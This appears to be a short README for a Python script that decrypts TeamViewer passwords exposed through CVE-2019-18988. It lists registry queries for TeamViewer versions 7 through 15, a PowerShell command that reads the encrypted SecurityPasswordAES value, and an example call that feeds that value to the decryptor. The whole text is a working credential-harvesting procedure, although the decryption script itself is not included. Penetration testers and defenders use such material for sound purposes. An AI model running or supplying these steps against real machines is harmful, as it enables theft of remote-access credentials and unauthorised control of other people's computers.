TeamViewer version that may be vulnerable to CVE-2019-18988 can have credentials harvested from the registry by searching in one of the following registries
```
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version8
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version9
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version10
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version11
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version12
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version13
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version14
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version15
```
To get the encrypted string
```
(get-itemproperty -path <idenitfied_registry_path>).SecurityPasswordAES
```
Then decrypt the string. The output will be printed line by line, this output does not need formatting, simple copy them and paste as an argument for use with the script

Example Usage
```
python3 tv_pw_decryptor.py "copy and paste (get-itemproperty -path <idenitfied_registry_path>).SecurityPasswordAES output"
```







